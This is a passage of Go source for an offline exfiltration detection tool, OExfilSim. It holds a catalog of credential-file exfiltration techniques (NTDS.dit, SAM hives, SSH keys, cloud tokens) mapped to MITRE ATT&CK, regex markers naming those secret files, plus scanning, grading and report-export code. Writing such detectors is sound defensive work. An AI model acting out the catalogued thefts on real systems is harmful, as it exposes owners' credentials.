		ID: "EX-NTDS", Name: "NTDS.dit exfil", Category: "Exfil", Platform: "windows",
		Tactic: "TA0006", Technique: "T1003.003", Severity: "critical",
		Summary:   "Ship ntds.dit + SYSTEM.",
		Detail:    "Ship ntds.dit + SYSTEM. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# NTDS.dit exfil", "# MITRE T1003.003"},
		Markers:   []string{"ntds\\.dit|ntdsutil.*ifm"},
		Detection: []string{"Hunt markers of NTDS.dit exfil", "Map to T1003.003", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1003.003"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-SAM", Name: "SAM hive exfil", Category: "Exfil", Platform: "windows",
		Tactic: "TA0006", Technique: "T1003.002", Severity: "high",
		Summary:   "Ship SAM/SECURITY/SYSTEM.",
		Detail:    "Ship SAM/SECURITY/SYSTEM. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# SAM hive exfil", "# MITRE T1003.002"},
		Markers:   []string{"\\\\\\\\SAM\\b|reg\\s+save\\s+HKLM\\\\\\\\SAM"},
		Detection: []string{"Hunt markers of SAM hive exfil", "Map to T1003.002", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1003.002"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-SSH-KEYS", Name: "SSH key exfil", Category: "Exfil", Platform: "linux",
		Tactic: "TA0006", Technique: "T1552.004", Severity: "high",
		Summary:   "Ship id_rsa / known_hosts.",
		Detail:    "Ship id_rsa / known_hosts. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# SSH key exfil", "# MITRE T1552.004"},
		Markers:   []string{"id_rsa|id_ed25519|\\.ssh/"},
		Detection: []string{"Hunt markers of SSH key exfil", "Map to T1552.004", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1552.004"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-CLOUD-TOKEN", Name: "Cloud token exfil", Category: "Exfil", Platform: "cross",
		Tactic: "TA0006", Technique: "T1552", Severity: "high",
		Summary:   "Ship AWS/Azure/GCP tokens.",
		Detail:    "Ship AWS/Azure/GCP tokens. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Cloud token exfil", "# MITRE T1552"},
		Markers:   []string{"\\.aws/credentials|AZURE_.*TOKEN|application_default_credentials"},
		Detection: []string{"Hunt markers of Cloud token exfil", "Map to T1552", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1552"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-VPN-CONFIG", Name: "VPN config exfil", Category: "Exfil", Platform: "cross",
		Tactic: "TA0006", Technique: "T1552", Severity: "medium",
		Summary:   "Ship ovpn/wg configs.",
		Detail:    "Ship ovpn/wg configs. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# VPN config exfil", "# MITRE T1552"},
		Markers:   []string{"\\.ovpn\\b|wg0\\.conf"},
		Detection: []string{"Hunt markers of VPN config exfil", "Map to T1552", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1552"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-DETECT-SCORE", Name: "Detection difficulty score", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1041", Severity: "info",
		Summary:   "Grade channel detectability A+..F.",
		Detail:    "Grade channel detectability A+..F. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Detection difficulty score", "# MITRE T1041"},
		Markers:   []string{"detect(ion)?.?score|detectability"},
		Detection: []string{"Hunt markers of Detection difficulty score", "Map to T1041", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1041"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-CHANNEL-PLAN", Name: "Channel selection plan", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1041", Severity: "info",
		Summary:   "Choose channel by egress policy.",
		Detail:    "Choose channel by egress policy. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Channel selection plan", "# MITRE T1041"},
		Markers:   []string{"channel.?plan|egress.?policy"},
		Detection: []string{"Hunt markers of Channel selection plan", "Map to T1041", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1041"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-RETRY", Name: "Retry / resume exfil", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1041", Severity: "low",
		Summary:   "Resume interrupted transfers.",
		Detail:    "Resume interrupted transfers. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Retry / resume exfil", "# MITRE T1041"},
		Markers:   []string{"resume.?upload|Range:\\s*bytes"},
		Detection: []string{"Hunt markers of Retry / resume exfil", "Map to T1041", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1041"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-PARALLEL", Name: "Parallel channel exfil", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1041", Severity: "medium",
		Summary:   "Split across multiple channels.",
		Detail:    "Split across multiple channels. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Parallel channel exfil", "# MITRE T1041"},
		Markers:   []string{"parallel.?exfil|multi.?channel"},
		Detection: []string{"Hunt markers of Parallel channel exfil", "Map to T1041", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1041"},
		Tags:      []string{"exfil", "channel"},
	},
	{
		ID: "EX-DEADDROP", Name: "Dead-drop exfil", Category: "Exfil", Platform: "cross",
		Tactic: "TA0010", Technique: "T1102", Severity: "medium",
		Summary:   "Write to shared dead drop.",
		Detail:    "Write to shared dead drop. For authorized lab analysis and detection engineering only.",
		Commands:  []string{"# Dead-drop exfil", "# MITRE T1102"},
		Markers:   []string{"dead.?drop|shared.?folder.?exfil"},
		Detection: []string{"Hunt markers of Dead-drop exfil", "Map to T1102", "Baseline legit use"},
		Refs:      []string{"ATT&CK T1102"},
		Tags:      []string{"exfil", "channel"},
	},
}

// catalogByID returns the entry with the given id, or ok=false.
func catalogByID(id string) (CatalogEntry, bool) {
	for _, e := range catalog {
		if strings.EqualFold(e.ID, id) {
			return e, true
		}
	}
	return CatalogEntry{}, false
}

// categories returns the sorted distinct category set in the catalog.
func categories() []string {
	seen := map[string]bool{}
	var out []string
	for _, e := range catalog {
		if e.Category != "" && !seen[e.Category] {
			seen[e.Category] = true
			out = append(out, e.Category)
		}
	}
	sort.Strings(out)
	return out
}

// platforms returns the sorted distinct platform set in the catalog.
func platforms() []string {
	seen := map[string]bool{}
	var out []string
	for _, e := range catalog {
		if e.Platform != "" && !seen[e.Platform] {
			seen[e.Platform] = true
			out = append(out, e.Platform)
		}
	}
	sort.Strings(out)
	return out
}

// searchCatalog matches a free-text query against most text fields.
func searchCatalog(q string) []CatalogEntry {
	q = strings.ToLower(strings.TrimSpace(q))
	if q == "" {
		return nil
	}
	terms := strings.Fields(q)
	var out []CatalogEntry
	for _, e := range catalog {
		hay := strings.ToLower(strings.Join([]string{e.ID, e.Name, e.Category, e.Platform, e.Tactic, e.Technique, e.Summary, e.Detail, strings.Join(e.Commands, " "), strings.Join(e.Tags, " ")}, " "))
		all := true
		for _, t := range terms {
			if !strings.Contains(hay, t) {
				all = false
				break
			}
		}
		if all {
			out = append(out, e)
		}
	}
	return out
}

// filterByCategory returns catalog entries in a category (case-insensitive).
func filterByCategory(cat string) []CatalogEntry {
	var out []CatalogEntry
	for _, e := range catalog {
		if strings.EqualFold(e.Category, cat) {
			out = append(out, e)
		}
	}
	return out
}

// filterByPlatform returns catalog entries for a platform.
func filterByPlatform(p string) []CatalogEntry {
	var out []CatalogEntry
	for _, e := range catalog {
		if strings.EqualFold(e.Platform, p) || strings.EqualFold(e.Platform, "any") || strings.EqualFold(e.Platform, "cross") {
			out = append(out, e)
		}
	}
	return out
}

// severityCounts tallies findings by severity.
func severityCounts(fs []Finding) map[string]int {
	m := map[string]int{}
	for _, f := range fs {
		m[strings.ToLower(f.Severity)]++
	}
	return m
}

// ====================================================================
//  GRADING ENGINE
// ====================================================================

// gradeFor converts an accumulated risk score into an A+..F grade.
func gradeFor(score int) string {
	switch {
	case score <= 0:
		return "A+"
	case score < 10:
		return "A"
	case score < 25:
		return "B"
	case score < 50:
		return "C"
	case score < 90:
		return "D"
	case score < 150:
		return "E"
	default:
		return "F"
	}
}

// scoreFindings sums weighted severities into a single risk score.
func scoreFindings(fs []Finding) int {
	total := 0
	for _, f := range fs {
		w := sevWeight[strings.ToLower(f.Severity)]
		if w == 0 {
			w = 3
		}
		total += w
	}
	return total
}

// gradeExplain returns a short human explanation of a grade.
func gradeExplain(g string) string {
	switch g {
	case "A+":
		return "No material exposure observed in this analysis."
	case "A":
		return "Minimal exposure; only low-impact items present."
	case "B":
		return "Minor exposure; review flagged items at leisure."
	case "C":
		return "Moderate exposure; remediation recommended."
	case "D":
		return "Significant exposure; prioritise remediation."
	case "E":
		return "Severe exposure; urgent remediation required."
	default:
		return "Critical exposure; treat as actively exploitable."
	}
}

// ====================================================================
//  MARKER SCANNER
// ====================================================================

// compiledMarker pairs a catalog entry with a compiled regex marker.
type compiledMarker struct {
	entry CatalogEntry
	re    *regexp.Regexp
	raw   string
}

// buildMarkers compiles every marker in the catalog once. Markers that
// fail to compile as regex are matched as literal substrings instead.
func buildMarkers() []compiledMarker {
	var out []compiledMarker
	for _, e := range catalog {
		for _, m := range e.Markers {
			re, err := regexp.Compile("(?i)" + m)
			if err != nil {
				re = nil
			}
			out = append(out, compiledMarker{entry: e, re: re, raw: m})
		}
	}
	return out
}

// scanReader reads a stream line by line and matches catalog markers,
// producing one finding per (entry, line) hit. Deduplicated per entry/line.
func scanReader(name string, r io.Reader) []Finding {
	markers := buildMarkers()
	sc := bufio.NewScanner(r)
	sc.Buffer(make([]byte, 1024*1024), 8*1024*1024)
	var findings []Finding
	at := map[string]int{} // entry ID → index in findings
	hits := map[string]int{}
	lineNo := 0
	for sc.Scan() {
		lineNo++
		text := sc.Text()
		low := strings.ToLower(text)
		for _, cm := range markers {
			hit := false
			if cm.re != nil {
				hit = cm.re.MatchString(text)
			} else {
				hit = strings.Contains(low, strings.ToLower(cm.raw))
			}
			if !hit {
				continue
			}
			if _, ok := at[cm.entry.ID]; ok {
				if hits[cm.entry.ID] < lineNo {
					hits[cm.entry.ID] = lineNo
					findings[at[cm.entry.ID]].Count++
				}
				continue
			}
			hits[cm.entry.ID] = lineNo
			ev := strings.TrimSpace(text)
			if len(ev) > 200 {
				ev = ev[:200] + "…"
			}
			// catalog markers are broad keywords — they add context, the
			// precise channel hints in scanIndicators carry the severity
			sev := "low"
			if sevRank[strings.ToLower(cm.entry.Severity)] < sevRank["low"] {
				sev = strings.ToLower(cm.entry.Severity)
			}
			at[cm.entry.ID] = len(findings)
			findings = append(findings, Finding{
				RuleID:    cm.entry.ID,
				Title:     cm.entry.Name,
				Severity:  sev,
				Score:     sevWeight[sev],
				Tactic:    cm.entry.Tactic,
				Technique: cm.entry.Technique,
				File:      name,
				Line:      lineNo,
				Evidence:  ev,
				Detail:    cm.entry.Summary,
				Detection: strings.Join(cm.entry.Detection, "; "),
				Refs:      cm.entry.Refs,
				Fprint:    fingerprint(cm.entry.ID, name),
				Count:     1,
			})
		}
	}
	for i := range findings {
		if findings[i].Count > 1 {
			findings[i].Detail += fmt.Sprintf(" (%d matching lines)", findings[i].Count)
		}
	}
	sortFindings(findings)
	return findings
}

// sortFindings orders findings by severity (desc) then file/line.
func sortFindings(fs []Finding) {
	sort.SliceStable(fs, func(i, j int) bool {
		ri, rj := sevRank[strings.ToLower(fs[i].Severity)], sevRank[strings.ToLower(fs[j].Severity)]
		if ri != rj {
			return ri > rj
		}
		if fs[i].File != fs[j].File {
			return fs[i].File < fs[j].File
		}
		return fs[i].Line < fs[j].Line
	})
}

// ====================================================================
//  SHANNON ENTROPY (used by several analyzers)
// ====================================================================

// shannonEntropy returns bits/byte entropy of a buffer (0..8).
func shannonEntropy(b []byte) float64 {
	if len(b) == 0 {
		return 0
	}
	var freq [256]int
	for _, c := range b {
		freq[c]++
	}
	var h float64
	n := float64(len(b))
	for _, f := range freq {
		if f == 0 {
			continue
		}
		p := float64(f) / n
		h -= p * math.Log2(p)
	}
	return h
}

// ====================================================================
//  COMMON DECODERS (deobfuscation helpers reused by tools)
// ====================================================================

// ====================================================================
//  REPORT BUILD + GRADING
// ====================================================================

func buildReport(mode, target string, fs []Finding) Report {
	sortFindings(fs)
	score := scoreFindings(fs)
	g := gradeFor(score)
	sc := severityCounts(fs)
	summary := fmt.Sprintf("%d finding(s): %d critical, %d high, %d medium, %d low, %d info.",
		len(fs), sc["critical"], sc["high"], sc["medium"], sc["low"], sc["info"])
	return Report{
		Tool:       APPNAME,
		Version:    VERSION,
		Tagline:    TAGLINE,
		Generated:  time.Now().Format(time.RFC3339),
		Target:     target,
		Mode:       mode,
		Findings:   fs,
		Grade:      g,
		Score:      score,
		Summary:    summary,
		MitrePrime: PRIMARY_MITRE,
	}
}

// ====================================================================
//  EXPORT ENGINE  (txt / md / json / csv / sarif)
// ====================================================================

func exportTXT(r Report) string {
	var b strings.Builder
	b.WriteString("OWL " + r.Tool + " — " + r.Tagline + "\n")
	b.WriteString("Version " + r.Version + "   Generated " + r.Generated + "\n")
	b.WriteString("Author khaled.s.haddad   owlsec.org\n")
	b.WriteString(strings.Repeat("=", 72) + "\n")
	if r.Target != "" {
		b.WriteString("Target : " + r.Target + "\n")
	}
	b.WriteString("Mode   : " + r.Mode + "\n")
	b.WriteString("Primary MITRE : " + r.MitrePrime + "\n")
	b.WriteString("Grade  : " + r.Grade + " (score " + strconv.Itoa(r.Score) + ") — " + gradeExplain(r.Grade) + "\n")
	b.WriteString("Summary: " + r.Summary + "\n")
	b.WriteString(strings.Repeat("-", 72) + "\n\n")
	for i, f := range r.Findings {
		b.WriteString(fmt.Sprintf("[%d] %s  (%s)\n", i+1, f.Title, strings.ToUpper(f.Severity)))
		b.WriteString("    Rule      : " + f.RuleID + "\n")
		b.WriteString("    MITRE     : " + f.Technique + "  " + f.Tactic + "\n")
		if f.File != "" {
			b.WriteString(fmt.Sprintf("    Location  : %s:%d\n", f.File, f.Line))
		}
		if f.Evidence != "" {
			b.WriteString("    Evidence  : " + f.Evidence + "\n")
		}
		if f.Detail != "" {
			b.WriteString("    Detail    : " + f.Detail + "\n")
		}
		if f.Detection != "" {
			b.WriteString("    Detection : " + f.Detection + "\n")
		}
		if len(f.Refs) > 0 {
			b.WriteString("    Refs      : " + strings.Join(f.Refs, ", ") + "\n")
		}
		b.WriteString("    Fingerprint: " + f.Fprint + "\n\n")
	}
	if len(r.Findings) == 0 {
		b.WriteString("No findings.\n")
	}
	b.WriteString(statsText(r.Traffic, false))
	return b.String()
}

func exportMD(r Report) string {
	var b strings.Builder
	b.WriteString("# OWL " + r.Tool + "\n\n")
	b.WriteString("*" + r.Tagline + "*\n\n")
	b.WriteString("| Field | Value |\n|---|---|\n")
	b.WriteString("| Version | " + r.Version + " |\n")
	b.WriteString("| Generated | " + r.Generated + " |\n")
	if r.Target != "" {
		b.WriteString("| Target | " + r.Target + " |\n")
	}
	b.WriteString("| Mode | " + r.Mode + " |\n")
	b.WriteString("| Primary MITRE | " + r.MitrePrime + " |\n")
	b.WriteString("| Grade | **" + r.Grade + "** (score " + strconv.Itoa(r.Score) + ") |\n")
	b.WriteString("| Summary | " + r.Summary + " |\n\n")
	b.WriteString(strings.TrimPrefix(statsText(r.Traffic, true), "\n"))
	b.WriteString("\n## Findings\n\n")
	if len(r.Findings) == 0 {
		b.WriteString("_No findings._\n")
		return b.String()
	}
	b.WriteString("| # | Severity | Title | MITRE | Location | Evidence |\n")
	b.WriteString("|---|---|---|---|---|---|\n")
	for i, f := range r.Findings {
		loc := ""
		if f.File != "" {
			loc = fmt.Sprintf("%s:%d", f.File, f.Line)
		}
		ev := strings.ReplaceAll(f.Evidence, "|", "\\|")
		if len(ev) > 60 {
			ev = ev[:60] + "…"
		}
		b.WriteString(fmt.Sprintf("| %d | %s | %s | %s | %s | %s |\n", i+1, strings.ToUpper(f.Severity), f.Title, f.Technique, loc, ev))
	}
	b.WriteString("\n### Detail\n\n")
	for i, f := range r.Findings {
		b.WriteString(fmt.Sprintf("#### %d. %s (%s)\n\n", i+1, f.Title, strings.ToUpper(f.Severity)))
		b.WriteString("- Rule: `" + f.RuleID + "`\n")
		b.WriteString("- MITRE: " + f.Technique + " / " + f.Tactic + "\n")
		if f.Detail != "" {
			b.WriteString("- Detail: " + f.Detail + "\n")
		}
		if f.Detection != "" {
			b.WriteString("- Detection: " + f.Detection + "\n")
		}
		if len(f.Refs) > 0 {
			b.WriteString("- Refs: " + strings.Join(f.Refs, ", ") + "\n")
		}
		b.WriteString("\n")
	}
	return b.String()
}

func exportJSON(r Report) string {
	buf, err := json.MarshalIndent(r, "", "  ")
	if err != nil {
		return "{}"
	}
	return string(buf)
}

func exportCSV(r Report) string {
	var buf bytes.Buffer
	w := csv.NewWriter(&buf)
	w.Write([]string{"index", "severity", "score", "ruleId", "title", "tactic", "technique", "file", "line", "evidence", "detection", "fingerprint"})
	for i, f := range r.Findings {
		w.Write([]string{
			strconv.Itoa(i + 1), f.Severity, strconv.Itoa(f.Score), f.RuleID, f.Title,
			f.Tactic, f.Technique, f.File, strconv.Itoa(f.Line), f.Evidence, f.Detection, f.Fprint,
		})
	}
	w.Flush()
	return buf.String()
}

// SARIF 2.1.0 structures (minimal, valid)
type sarifLog struct {
	Schema  string     `json:"$schema"`
	Version string     `json:"version"`
	Runs    []sarifRun `json:"runs"`
}
type sarifRun struct {
	Tool    sarifTool     `json:"tool"`
	Results []sarifResult `json:"results"`
}
type sarifTool struct {
	Driver sarifDriver `json:"driver"`
}
type sarifDriver struct {
	Name           string      `json:"name"`
	Version        string      `json:"version"`
	InformationURI string      `json:"informationUri"`
	Rules          []sarifRule `json:"rules"`
}
type sarifRule struct {
	ID               string            `json:"id"`
	Name             string            `json:"name"`
	ShortDescription sarifText         `json:"shortDescription"`
	FullDescription  sarifText         `json:"fullDescription"`
	HelpURI          string            `json:"helpUri,omitempty"`
	Properties       map[string]string `json:"properties,omitempty"`
}
type sarifText struct {
	Text string `json:"text"`
}
type sarifResult struct {
	RuleID    string            `json:"ruleId"`
	Level     string            `json:"level"`
	Message   sarifText         `json:"message"`
	Locations []sarifLocation   `json:"locations,omitempty"`
	Fprints   map[string]string `json:"fingerprints,omitempty"`
	Props     map[string]string `json:"properties,omitempty"`
}
type sarifLocation struct {
	PhysicalLocation sarifPhysical `json:"physicalLocation"`
}
type sarifPhysical struct {
	ArtifactLocation sarifArtifact `json:"artifactLocation"`
	Region           *sarifRegion  `json:"region,omitempty"`
}
type sarifArtifact struct {
	URI string `json:"uri"`
}
type sarifRegion struct {
	StartLine int `json:"startLine"`
}

func sarifLevel(sev string) string {
	switch strings.ToLower(sev) {
	case "critical", "high":
		return "error"
	case "medium":
		return "warning"
	default:
		return "note"
	}
}

func exportSARIF(r Report) string {
	ruleSet := map[string]sarifRule{}
	var results []sarifResult
	for _, f := range r.Findings {
		if _, ok := ruleSet[f.RuleID]; !ok {
			ruleSet[f.RuleID] = sarifRule{
				ID:               f.RuleID,
				Name:             f.Title,
				ShortDescription: sarifText{Text: f.Title},
				FullDescription:  sarifText{Text: f.Detail},
				HelpURI:          "https://owlsec.org/" + strings.ToLower(APPNAME),
				Properties:       map[string]string{"tactic": f.Tactic, "technique": f.Technique, "severity": f.Severity},
			}
		}
		res := sarifResult{
			RuleID:  f.RuleID,
			Level:   sarifLevel(f.Severity),
			Message: sarifText{Text: f.Title + ": " + f.Detail},
			Fprints: map[string]string{"owl/v1": f.Fprint},
			Props:   map[string]string{"severity": f.Severity, "technique": f.Technique},
		}
		if f.File != "" {
			reg := &sarifRegion{StartLine: f.Line}
			if f.Line <= 0 {
				reg = nil
			}
			res.Locations = []sarifLocation{{PhysicalLocation: sarifPhysical{ArtifactLocation: sarifArtifact{URI: f.File}, Region: reg}}}
		}
		results = append(results, res)
	}
	var rules []sarifRule
	for _, v := range ruleSet {
		rules = append(rules, v)
	}
	sort.Slice(rules, func(i, j int) bool { return rules[i].ID < rules[j].ID })
	log := sarifLog{
		Schema:  "https://json.schemastore.org/sarif-2.1.0.json",
		Version: "2.1.0",
		Runs: []sarifRun{{
			Tool: sarifTool{Driver: sarifDriver{
				Name:           "OWL-" + APPNAME,
				Version:        VERSION,
				InformationURI: "https://owlsec.org",
				Rules:          rules,
			}},
			Results: results,
		}},
	}
	buf, _ := json.MarshalIndent(log, "", "  ")
	return string(buf)
}

// renderReport selects a format.
func renderReport(r Report, format string) string {
	switch strings.ToLower(format) {
	case "md", "markdown":
		return exportMD(r)
	case "json":
		return exportJSON(r)
	case "csv":
		return exportCSV(r)
	case "sarif":
		return exportSARIF(r)
	default:
		return exportTXT(r)
	}
}

// writeOut writes rendered output to a file or stdout.
func writeOut(content, path string) error {
	if path == "" {
		fmt.Print(content)
		if !strings.HasSuffix(content, "\n") {
			fmt.Println()
		}
		return nil
	}
	return os.WriteFile(path, []byte(content), 0644)
}

// ====================================================================
//  HOW TO USE SCREEN  (mandatory — menu item + --howto flag)
// ====================================================================

type HowtoSection struct {
	Title string
	Lines []string
}

var howtoSections = []HowtoSection{
	{Title: "LEGAL & ETHICAL WARNING", Lines: []string{
		"OExfilSim is for AUTHORIZED security testing, detection engineering and education ONLY.",
		"Use it exclusively on systems, files and logs you own or are explicitly permitted",
		"in writing to assess. Unauthorized use of the techniques catalogued here may be a crime.",
		"This tool is an OFFLINE analyzer / planner / catalog: it does NOT launch live attacks",
		"against third-party systems. You are solely responsible for staying in scope.",
	}},
	{Title: "HOW TO USE", Lines: []string{
		"1. Capture or export authorised traffic: pcap/pcapng, Zeek conn/dns/ssl/http logs, or a flow CSV.",
		"2. Run: OExfilSim capture.pcapng   (several Zeek logs at once are joined by uid)",
		"3. Review findings: DNS / ICMP channels, cloud & paste drops, alt-protocol bulk egress, chunking.",
		"4. Scripts and command logs get an indicator scan (staging + transfer tooling).",
		"5. Plan a purple-team test with the Channel simulator to see which rules would fire, and when.",
		"6. Export txt|md|json|csv|sarif; generate Sigma from the catalog with --sigma.",
	}},
	{Title: "REQUIREMENTS", Lines: []string{
		"- Offline analyzer; Go stdlib only; captures are read, never replayed.",
		"- The simulator is a mathematical model — it generates no traffic.",
		"- Authorized testing only; written permission required.",
	}},
	{Title: "DETECTION NOTES", Lines: []string{
		"Byte counts come from IP length fields, so snaplen-truncated captures still measure volume.",
		"Egress = internal client → external server (RFC1918/ULA/CGNAT are internal).",
		"Thresholds: --vol-med / --vol-high per destination; ICMP ≥ 4 KB of non-ping payload;",
		"DNS ≥ 20 unique subdomains, mean ≥ 18 chars, entropy ≥ 3.5 under one domain.",
		"Beacons: ≥ 10 sessions, ≥ 70% of gaps within ±20% of the median, ≤ 16 KB out / 32 KB in each.",
		"DoH/DoT: port 853, or 443 to known resolvers (SNI or anycast IP); HIGH when ≥ 1 MB goes up.",
		"Baselines: --learn merges captures per host; --baseline flags ≥ 1 MB to new destinations,",
		"unprofiled hosts ≥ --vol-med, and egress rates > 3× (HIGH > 10×) the learned peak.",
	}},
}

// showHowto renders the HOW TO USE screen with the cyan UI.
func showHowto() {
	clear()
	banner()
	sectionHeader("How to use — " + APPNAME)
	for _, s := range howtoSections {
		fmt.Println()
		fmt.Println("  " + col("▸ "+s.Title, CY+B))
		for _, ln := range s.Lines {
			if ln == "" {
				fmt.Println()
				continue
			}
			fmt.Println("    " + col(ln, W))
		}
	}
	line(64)
	fmt.Println("  " + col("Primary MITRE mapping: ", DIM) + col(PRIMARY_MITRE, R))
	fmt.Println("  " + col("Authorized testing only — see LEGAL & ETHICAL WARNING above.", GY))
}

// howtoText returns the HOW TO USE content as plain text (for --howto).
func howtoText() string {
	var b strings.Builder
	b.WriteString("OWL " + APPNAME + " — HOW TO USE\n")
	b.WriteString(TAGLINE + "\n")
	b.WriteString(strings.Repeat("=", 72) + "\n")
	for _, s := range howtoSections {
		b.WriteString("\n## " + s.Title + "\n")
		for _, ln := range s.Lines {
			b.WriteString("  " + ln + "\n")
		}
	}
	b.WriteString("\nPrimary MITRE mapping: " + PRIMARY_MITRE + "\n")
	return b.String()
}

// ====================================================================
//  CATALOG BROWSER (shared interactive + CLI views)
// ====================================================================

// printCatalogTable prints a compact table of entries.
func printCatalogTable(entries []CatalogEntry) {
	if len(entries) == 0 {
		warnMsg("No catalog entries match.")
		return
	}
	rows := [][]string{}
	for _, e := range entries {
		rows = append(rows, []string{e.ID, trunc(e.Name, 34), e.Platform, strings.ToUpper(e.Severity), e.Technique})
	}
	table([]string{"ID", "NAME", "PLATFORM", "SEV", "MITRE"}, rows)
	fmt.Println()
	info(fmt.Sprintf("%d entr%s.", len(entries), plural(len(entries))))
}

func plural(n int) string {
	if n == 1 {
		return "y"
	}
	return "ies"
}

func trunc(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n-1] + "…"
}

// showEntry prints a full catalog entry card.
func showEntry(e CatalogEntry) {
	fmt.Println()
	fmt.Println("  " + col("╭─ "+e.ID+" — "+e.Name, CY+B))
	fmt.Println("  " + col("│ Category : ", DR) + col(e.Category, W))
	fmt.Println("  " + col("│ Platform : ", DR) + col(e.Platform, W))
	fmt.Println("  " + col("│ Severity : ", DR) + col(strings.ToUpper(e.Severity), sevColor(e.Severity)))
	fmt.Println("  " + col("│ Tactic   : ", DR) + col(e.Tactic, W))
	fmt.Println("  " + col("│ Technique: ", DR) + col(e.Technique, W))
	fmt.Println("  " + col("╰─", DR))
	fmt.Println("  " + col("Summary: ", CY+B) + col(e.Summary, W))
	if e.Detail != "" {
		fmt.Println()
		for _, ln := range wrap(e.Detail, 78) {
			fmt.Println("    " + col(ln, GY))
		}
	}
	if len(e.Commands) > 0 {
		fmt.Println()
		fmt.Println("  " + col("Example / reference commands:", CY+B))
		for _, c := range e.Commands {
			fmt.Println("    " + col("$ ", DR) + col(c, W))
		}
	}
	if len(e.Markers) > 0 {
		fmt.Println()
		fmt.Println("  " + col("Scan markers (regex):", CY+B))
		for _, m := range e.Markers {
			fmt.Println("    " + col(m, YLW))
		}
	}
	if len(e.Detection) > 0 {
		fmt.Println()
		fmt.Println("  " + col("Detection guidance:", CY+B))
		for _, d := range e.Detection {
			fmt.Println("    " + col("• "+d, W))
		}
	}
	if len(e.Refs) > 0 {
		fmt.Println()
		fmt.Println("  " + col("References: ", DIM) + col(strings.Join(e.Refs, "  "), GY))
	}
}

// wrap wraps text to a width.
func wrap(s string, width int) []string {
	words := strings.Fields(s)
	var lines []string
	var cur string
	for _, w := range words {
		if cur == "" {
			cur = w
		} else if len(cur)+1+len(w) <= width {
			cur += " " + w
		} else {
			lines = append(lines, cur)
			cur = w
		}
	}
	if cur != "" {
		lines = append(lines, cur)
	}
	return lines
}

// ====================================================================
//  GENERIC PLANNER (catalog -> prioritized action plan)
// ====================================================================

func gradeLineOut(rep Report) {
	fmt.Println("  " + col("Grade : ", CY+B) + col(rep.Grade, sevColorForGrade(rep.Grade)+B) + col("  score "+strconv.Itoa(rep.Score), GY))
	fmt.Println("  " + col(gradeExplain(rep.Grade), GY))
	fmt.Println("  " + col(rep.Summary, W))
}

func sevColorForGrade(g string) string {
	switch g {
	case "A+", "A":
		return GRN
	case "B", "C":
		return YLW
	default:
		return R
	}
}

// ====================================================================
//  IOC EXTRACTOR + TIMELINE + FINDING MERGE UTILITIES
// ====================================================================

// ====================================================================
//  ATT&CK COVERAGE MATRIX
// ====================================================================

// attackCoverage prints a tactic x technique coverage matrix derived from
// the catalog, useful for detection-engineering gap analysis.
func attackCoverage() {
	clear()
	banner()
	sectionHeader("ATT&CK Coverage Matrix")
	byTactic := map[string][]string{}
	techSeverity := map[string]string{}
	for _, e := range catalog {
		tac := e.Tactic
		if tac == "" {
			tac = "(unmapped)"
		}
		byTactic[tac] = append(byTactic[tac], e.Technique)
		if sevRank[strings.ToLower(e.Severity)] > sevRank[strings.ToLower(techSeverity[e.Technique])] {
			techSeverity[e.Technique] = e.Severity
		}
	}
	var tacs []string
	for k := range byTactic {
		tacs = append(tacs, k)
	}
	sort.Strings(tacs)
	rows := [][]string{}
	for _, tac := range tacs {
		uniq := uniqueSorted(byTactic[tac])
		rows = append(rows, []string{trunc(tac, 34), strconv.Itoa(len(byTactic[tac])), strconv.Itoa(len(uniq)), trunc(strings.Join(uniq, ","), 40)})
	}
	table([]string{"TACTIC", "ENTRIES", "TECHNIQUES", "IDS"}, rows)
	fmt.Println()
	info(fmt.Sprintf("%d distinct techniques across %d tactics.", len(techSeverity), len(tacs)))
}

// uniqueSorted returns a deduplicated, sorted copy of a string slice.
func uniqueSorted(in []string) []string {
	seen := map[string]bool{}
	var out []string
	for _, s := range in {
		if s == "" || seen[s] {
			continue
		}
		seen[s] = true
		out = append(out, s)
	}
	sort.Strings(out)
	return out
}

// attackCoverageText returns the coverage matrix as plain text (CLI).
func attackCoverageText() string {
	byTactic := map[string]int{}
	byTech := map[string]bool{}
	for _, e := range catalog {
		tac := e.Tactic
		if tac == "" {
			tac = "(unmapped)"
		}
		byTactic[tac]++
		byTech[e.Technique] = true
	}
	var b strings.Builder
	b.WriteString(APPNAME + " ATT&CK coverage: " + strconv.Itoa(len(byTech)) + " techniques\n")
	var tacs []string
	for k := range byTactic {
		tacs = append(tacs, k)
	}
	sort.Strings(tacs)
	for _, tac := range tacs {
		b.WriteString(fmt.Sprintf("  %-40s %d\n", tac, byTactic[tac]))
	}
	return b.String()
}

// ====================================================================
//  SIGMA-STYLE DETECTION RULE GENERATOR
// ====================================================================

// yamlEscape quotes a string for a simple inline YAML scalar.
func yamlEscape(s string) string {
	if s == "" {
		return "''"
	}
